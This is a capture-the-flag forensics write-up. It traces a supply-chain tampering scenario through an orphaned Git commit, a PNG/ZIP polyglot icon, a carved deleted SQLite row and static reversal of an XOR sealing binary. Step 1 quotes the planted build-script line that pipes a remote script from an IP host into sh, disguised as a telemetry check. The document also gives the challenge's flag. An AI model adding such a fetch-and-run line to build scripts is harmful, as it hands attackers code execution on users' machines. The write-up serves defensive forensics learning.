# Polyglot Requiem

> Forensics · Medium · Mohamed Amine Mzoughi  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{p0lygl0t_r3qu13m_1d0a73980738}`

**Challenge**

> A review of a ground-station software supply chain turned up altered build history and an odd dashboard asset. Recover the concealed marker from the retained repository. Inspect build scripts, hooks and recovered programs as data: do not run them.

The attachment is `polyglot-requiem.zip` (39,051 bytes, SHA-256 `2a3aeda4…13c9`). It unpacks to the `flight-telemetry-sdk` repository, kept *with its `.git` directory and unreferenced objects* — a strong nudge to look at what the branches no longer point to.

**Approach / walkthrough**

*1. Find the commit cut out of history.* `master` looks clean, so ask Git for unreachable objects:

```sh
git -C flight-telemetry-sdk fsck --unreachable --no-progress
cat flight-telemetry-sdk/.git/ORIG_HEAD
git -C flight-telemetry-sdk show --format=raw c435f88
```

`fsck` reports `unreachable commit c435f883…`, which `ORIG_HEAD` still names, so the branch was reset past it. The commit sits on top of `ci: add build script` and slips a line into `build.sh`:

```
+curl -s http://198.51.100.9/telemetry-opt-in.sh | sh  # telemetry opt-in check
```

That is the supply-chain implant (treat it as evidence; do not run it or contact the host). Note its raw timestamp `1792061626` (2026-10-15 11:53:46 +0100) — every commit in the repo carries it, and it comes back in step 6.

*2. Pull the hidden ZIP out of the dashboard icon.* `assets/telemetry_icon.png` is a 10×10 image but 23,008 bytes. A hexdump shows the PNG proper ends at its `IEND` CRC (byte `0x71`) and carries a `tEXt` chunk `Provenance` = `0f18e37122ddbcca`; a ZIP local header (`PK\x03\x04`) starts right after `IEND` at `0x72`. Image viewers stop at `IEND` while `unzip` finds the central directory from the end of the file, so one file is both:

```sh
unzip -o flight-telemetry-sdk/assets/telemetry_icon.png -d out
```

It warns about 114 extra leading bytes but extracts `telemetry_cache.db` (SQLite) and `assetsignd` (x86-64 ELF).

*3. Recover the deleted SQLite row.* `SELECT id,label,length(payload) FROM build_secrets` returns four decoy rows (demo AWS key, `not_a_real_token`, a fake npm token, an all-zero pad row), but `strings` shows a label `ci_provenance_seal` that is no longer in the table — a deleted row. Page 2 is the table's single leaf page at offset `0x1000`; its header reads `0d 0000 0004 0ea3 …` (table-leaf, 4 live cells, content area starts at `0x0ea3`) followed by the four cell pointers `0faf 0f5c 0f03 0ea3` and then a fifth pointer, `0e67`, that the cell count no longer covers. Deleting the row cut the count from 5 to 4 and advanced the content start past the cell, but nothing was overwritten, so the record is intact at `0x1e67`:

```
3a 05            payload length 58, rowid 5
04 00 31 54      header: NULL (id = rowid), text len 18, blob len 36
"ci_provenance_seal" + 36-byte blob eec4bf28…c401
```

A short carver walks any stale pointer past the live array and saves the 36-byte blob to `out/rowid5.bin`. It looks random — it was sealed with the tool shipped beside it.

*4. Static RE of `assetsignd` (never run).* `.rodata` gives the usage `assetsignd <provenance_tag_hex> <epoch> <infile> <outfile>`, a `%02x` hex-parse format, and the SHA-256 round constants at `0x2060`. The binary is stripped, so `main` is found from `_start`, which hands `main` (0x1260) to `__libc_start_main` through its GOT slot. Reading `main` in order: `argv[2]` → `strtoull(…,10)` is the **epoch**; `argv[1]` is parsed by a `sscanf("%02x")` loop into raw tag bytes, then a pointer-forward/pointer-backward loop **reverses the tag in place**; the epoch is written as 8 **little-endian** bytes right behind the reversed tag; that buffer is SHA-256'd (initial IVs `0x6a09e667…0x5be0cd19`, `0x80` padding and the big-endian bit length are all visible); and a final loop does `data[i] ^= digest[i & 0x1f]` over the input file. So `key = SHA-256(reversed tag bytes ‖ epoch as 8 LE bytes)`, and the output is the input XORed with the repeating 32-byte key.

*5. Unseal.* Every input is now in hand: tag `0f18e37122ddbcca` (the icon's `Provenance` chunk), epoch `1792061626` (the rewritten commit), and the carved blob. XOR is its own inverse, so a Python port of the sealer — keeping the byte reversal — unseals:

```python
material = bytes.fromhex("0f18e37122ddbcca")[::-1] + (1792061626).to_bytes(8, "little")
key = hashlib.sha256(material).digest()
print(bytes(b ^ key[i % 32] for i, b in enumerate(open("out/rowid5.bin","rb").read())).decode())
# CSCTF{p0lygl0t_r3qu13m_1d0a73980738}
```

**Why it works**

The icon is a PNG/ZIP polyglot: PNG readers stop at `IEND`, ZIP readers parse from the end, so one 23 KB "icon" displays a 10×10 image and also carries the sealing tool and its cache database. SQLite doesn't wipe a deleted row — it drops the cell from the page's pointer count and leaves the record bytes in unallocated space, where a stale pointer still leads to them. `assetsignd` is only a repeating 32-byte XOR keyed with SHA-256 over the reversed `Provenance` tag and an epoch, so anyone holding both can undo it without running the program. The epoch is the timestamp of the very commit the history rewrite tried to hide — still remembered in `ORIG_HEAD` and stamped on every commit and on the files inside the icon's ZIP.

**Validation / reproduction**

The port's output is clean `CSCTF{...}` ASCII across all 36 bytes. With a repeating 32-byte XOR key, a wrong tag order or epoch would give random bytes, so clean text confirms both inputs and the in-place reversal were ported correctly. Reproduction: `git fsck --unreachable` + `ORIG_HEAD` for the commit and epoch, `unzip` the icon, carve rowid 5 from page 2, read the seal scheme out of `assetsignd` statically, then XOR. Accepted on the first submission.
